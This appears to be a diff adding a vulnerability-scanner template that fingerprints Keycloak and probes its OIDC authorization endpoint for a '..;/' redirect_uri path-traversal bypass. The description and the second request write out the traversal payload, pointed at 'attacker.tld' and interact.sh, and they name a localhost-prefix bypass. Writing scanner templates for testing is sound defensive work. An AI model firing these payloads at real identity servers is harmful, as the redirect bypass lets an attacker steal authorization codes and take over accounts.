@@ -1,0 +1,92 @@
+id: keycloak-redirect-pathtraversal
+
+info:
+  name: Keycloak ..; Path Traversal in OIDC Redirect (CVE-2026-3872 / CVE-2024-8883)
+  author: custom
+  severity: high
+  description: |
+    Keycloak ≤ 26.0.x is vulnerable to a `..;/` path traversal in the OIDC
+    authorization endpoint's redirect_uri validation, allowing an attacker
+    to register a redirect_uri that bypasses the registered-URI allowlist.
+    The classic exploit:
+
+      redirect_uri=https://kc.target.tld/realms/master/account/..;/@attacker.tld/
+
+    Keycloak's URI parser walks the `..;/` and treats `@attacker.tld` as the
+    authority of the final URL, while the validation logic checks only the
+    pre-`..;/` portion against the allowlist.
+
+    Combined with CVE-2024-8883 (`http://localhost*` prefix bypass —
+    `localhost.evil.tld` was permitted in ≤ 25.x), this is the highest-yield
+    Keycloak redirect attack against unpatched deployments.
+
+    Detection here is fingerprint-only (Keycloak is reachable and serves an
+    OIDC discovery doc + the /auth endpoint exists). Manual confirmation
+    requires a known valid client_id on the realm.
+  reference:
+    - https://cvefeed.io/vuln/detail/CVE-2026-3872
+    - https://github.com/keycloak/keycloak/security/advisories
+    - https://securityblog.omegapoint.se/en/writeup-authentik-cve-2024-52289/
+  tags: oauth,keycloak,cve,pathtraversal,high
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/realms/master/.well-known/openid-configuration"
+      - "{{BaseURL}}/auth/realms/master/.well-known/openid-configuration"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - '"issuer"'
+          - "keycloak"
+        condition: and
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: keycloak_issuer
+        part: body
+        group: 1
+        regex:
+          - '"issuer"\s*:\s*"([^"]+)"'
+
+      - type: regex
+        name: authorization_endpoint
+        part: body
+        group: 1
+        regex:
+          - '"authorization_endpoint"\s*:\s*"([^"]+)"'
+
+  # Second request: probe the authorize endpoint with the path-traversal
+  # payload. Tested with a placeholder client_id — Keycloak's validation
+  # order varies by version; some return 400 on invalid client_id BEFORE
+  # the URI check, others process URI first. The 400 vs 302 differential
+  # is itself useful intel.
+  - method: GET
+    path:
+      - "{{BaseURL}}/realms/master/protocol/openid-connect/auth?response_type=code&client_id=account&redirect_uri=https://{{Hostname}}/realms/master/account/..%3B/@interact.sh/&scope=openid"
+      - "{{BaseURL}}/auth/realms/master/protocol/openid-connect/auth?response_type=code&client_id=account&redirect_uri=https://{{Hostname}}/realms/master/account/..%3B/@interact.sh/&scope=openid"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      # Confirmed bypass: 302 with Location at attacker host
+      - type: status
+        status:
+          - 302
+          - 303
+          - 307
+
+      - type: word
+        part: header
+        words:
+          - "Location: https://interact.sh"
+          - "location: https://interact.sh"
+        condition: or
